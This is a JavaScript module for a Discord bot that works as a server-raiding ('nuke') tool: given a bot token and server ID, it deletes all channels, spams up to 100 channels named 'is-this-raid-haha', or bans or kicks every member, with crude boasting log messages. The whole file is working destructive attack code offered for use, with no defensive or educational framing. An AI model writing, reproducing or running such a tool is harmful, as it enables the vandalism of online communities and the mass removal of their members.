const { Client } = require("discord.js");
const bot = new Client();

const act_type = ["delete_channel", "create_channel", "getout"];

async function doit(response, token, serverid, act) {
  console.log(typeof serverid);
    if (!token) {
      response.send("Invalid token");
    } else if (!serverid) {
      response.send("ServerID is required!");
    } else if (!act) {
      response.send("Action is required!");
    } else {
      bot.login(`${token}`).catch(e => {
        response.send("Invalid token<br />" + e);
      });
        bot.on("ready", () => {
          console.log(`[ ${bot.user.tag} ] Ready`);
          bot.user.setActivity('Ready to make happiness!');
          const server = bot.guilds.cache.get(`${serverid}`);
          if (!server) return response.status(404).send("I CANNOT FETCH THE SERVER!!");
          
          const select = act_type.indexOf(act);
          if (select == 0) {
            doDeleteChannel(`${serverid}`).catch(e => response.send(e)).then(res => response.send(res));
          } else if (select == 1) {
            doCreateChannel(`${serverid}`, 99).catch(e => response.send(e)).then(res => response.send(res));
          } else if (select == 2) {
            doFuckingMembers(`${serverid}`).catch(e => response.send(e)).then(res => response.send(res));
          } else {
            response.send("INVALID ACT");
          }
        });
    }
}

async function doDeleteChannel(guild_id) {
  return new Promise((resolve, reject) => {
    const server = bot.guilds.cache.get(guild_id);
    if (!server.channels.cache.size) {
      reject("Channel doens't have one more!");
      process.exit(0);
    } else {
      let i = 0;
      console.log(`[ ${bot.user.tag} ] Ready for delete all channels!`);
      server.channels.cache.forEach(channel => {
        i++;
        channel.delete().then(() => console.log(`[ ${bot.user.tag} ] Deleted ${channel.name}`)).catch((err_c) => {
          process.exit(0);
          console.error(`[ ${bot.user.tag} ] Failed to delete ${channel.name} because ${err_c}`);
          reject(`[ ${bot.user.tag} ] Failed to delete ${channel.name} because ${err_c}`);
        });
      });
      if ((i+1) >= server.channels.cache.size) {
          resolve(`Successfuly deleted all channel !`);
          process.exit(1);
        }
    }
  });
}

async function doCreateChannel(guild_id, channel_count) {
  return new Promise((resolve, reject) => {
    const server = bot.guilds.cache.get(guild_id);
    const namaSet = "is-this-raid-haha";
    if (channel_count > 100) {
      return reject("Limited Channel Count!");
    }
    for (let i = 0; i < channel_count; i++) {
      server.channels.create(namaSet, { reason: "iam bored" }).then(() => {
      console.log(`[ ${bot.user.tag}:${i+1} ] Create new channel..`);
        if ((i+1) >= channel_count) {
          bot.destroy();
          resolve("Successfuly!");
          process.exit(1);
        }
      }).catch(e => {
        console.error(`[ ${bot.user.tag}:${i+1} ] Failed to create channel!`);
        if ((i+1) == 50) {
          reject("FAILED TO CREATE CHANNEL BECAUSE:<br />" + e);
          process.exit(0);
        }
      });
    }
  });
}

async function doFuckingMembers(guild_id) {
  return new Promise((resolve, reject) => {
    const server = bot.guilds.cache.get(guild_id);
    let i = 0;
    server.members.cache.forEach(member => {
      i++;
      if ((i+1) >= server.members.cache.size) {
        resolve("Successfuly fucking all members!");
        process.exit(0);
      }
      if (server.me.hasPermission("BAN_MEMBERS")) {
        member.ban({ reason: "Nice idea" }).catch(e => console.error(`[ ${bot.user.tag} ] Failed to ban member ${member.user.username}`)).then(() => console.log(`[ ${bot.user.tag} ] Successfuly banned ${member.user.username}`));
      } else if (server.me.hasPermission("KICK_MEMBERS")) {
        member.kick({ reason: "Nice idea" }).catch(e => console.error(`[ ${bot.user.tag} ] Failed to kick member ${member.user.username}`)).then(() => console.log(`[ ${bot.user.tag} ] Successfuly kicked ${member.user.username}`));
      } else {
        reject("Invalid Permission!");
        process.exit(0);
      }
    });
    
  });
}

module.exports = {
  doit,
  doDeleteChannel,
  doCreateChannel,
  doFuckingMembers
}